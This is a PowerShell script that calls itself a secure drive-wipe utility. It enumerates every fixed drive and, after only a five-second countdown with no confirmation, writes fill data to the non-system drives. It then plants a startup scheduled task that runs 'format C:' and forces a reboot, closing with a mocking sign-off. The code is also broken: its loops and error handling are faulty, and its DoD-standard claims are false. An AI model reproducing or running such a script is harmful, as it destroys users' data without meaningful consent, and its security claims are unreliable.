#Requires -RunAsAdministrator

<#
.SYNOPSIS
Secure Multi-Drive Wipe Utility v2.1
.DESCRIPTION
Securely erases all non-system drives with 3-pass DoD 5220.22-M standard
Handles system drive via secure wipe + reformat on reboot
#>

function Invoke-SecureWipe {
    param(
        [string]$driveLetter,
        [int]$passes = 3
    )
    
    try {
        $drivePath = "$($driveLetter):"
        $totalSize = (Get-Partition -DriveLetter $driveLetter).Size
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

        # 3-pass overwrite (DoD 5220.22-M compliant)
        1..$passes | ForEach-Object {
            $stream = [System.IO.File]::OpenWrite("\\?\$drivePath\WIPE.dat")
            $buffer = New-Object byte[] (1MB)
            $bytesWritten = 0
            
            while ($true) {
                switch ($_) {
                    1 { $rng.GetBytes($buffer) }   # Random pass
                    2 { [byte[]]::Fill($buffer, 0) }  # Zero pass
                    3 { [byte[]]::Fill($buffer, 0xFF) }  # One pass
                }
                
                $stream.Write($buffer, 0, $buffer.Length)
                $bytesWritten += $buffer.Length
                $percentComplete = ($bytesWritten / $totalSize) * 100
                Write-Host "[$driveLetter] Pass $_: $($percentComplete.ToString('N1'))% completed"
            }
        }
    } catch [System.IO.IOException] {
        # Drive filled successfully
    } finally {
        if ($stream) { $stream.Close() }
        Remove-Item -Path "\\?\$drivePath\WIPE.dat" -Force -ErrorAction SilentlyContinue
    }
}

# --- Execution Start ---
Write-Host "`n=== SECURE DRIVE ERASURE UTILITY ==="
Write-Host "=== WARNING: IRREVERSIBLE DATA DESTRUCTION ==="
Write-Host "`nInitializing..."

# Safety countdown
Write-Host "`n[!] WIPE PROCESS WILL BEGIN IN:"
5..0 | ForEach-Object {
    Write-Host "`r$_ seconds remaining... " -NoNewline -ForegroundColor Red
    if ($_ -gt 0) { Start-Sleep -Seconds 1 }
}

# Detect target drives
$allDrives = Get-Partition | Where-Object {
    $_.DriveLetter -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

$nonSystemDrives = $allDrives | Where-Object { $_ -ne 'C' }
$systemDrive = 'C'

Write-Host "`nDetected drives: $($allDrives -join ', ')"

# Phase 1: Wipe non-system drives
if ($nonSystemDrives) {
    Write-Host "`n--- WIPING NON-SYSTEM DRIVES ---"
    foreach ($drive in $nonSystemDrives) {
        Write-Host "[+] Processing drive $drive"
        Invoke-SecureWipe -driveLetter $drive
    }
}

# Phase 2: System drive handling
if ($allDrives -contains 'C') {
    Write-Host "`n--- SYSTEM DRIVE PROCEDURE ---"
    
    # Schedule post-reboot wipe
    $scriptBlock = {
        cmd /c "cipher /w:C:\ > NUL && format C: /FS:NTFS /P:3 /Q /Y > NUL"
    }
    
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
        -Argument "-Command `"$($scriptBlock -replace '"','\"')`""
    
    Register-ScheduledTask -TaskName "FinalWipe" `
        -Trigger $trigger -Action $action -Force | Out-Null
    
    Write-Host "[!] System drive C: scheduled for secure wipe on reboot"
    Write-Host "[!] System will restart in 5 seconds..."
    Start-Sleep -Seconds 5
    Restart-Computer -Force
}

# Final message (only shown if C: wasn't wiped)
Write-Host "`n=== OPERATION COMPLETE ==="
Write-Host "All files erased from non-system drives"
Write-Host "System drive C: requires reboot to complete"
Write-Host "`nHave a Shit Day! x_X"
Read-Host "`nPress any key to exit"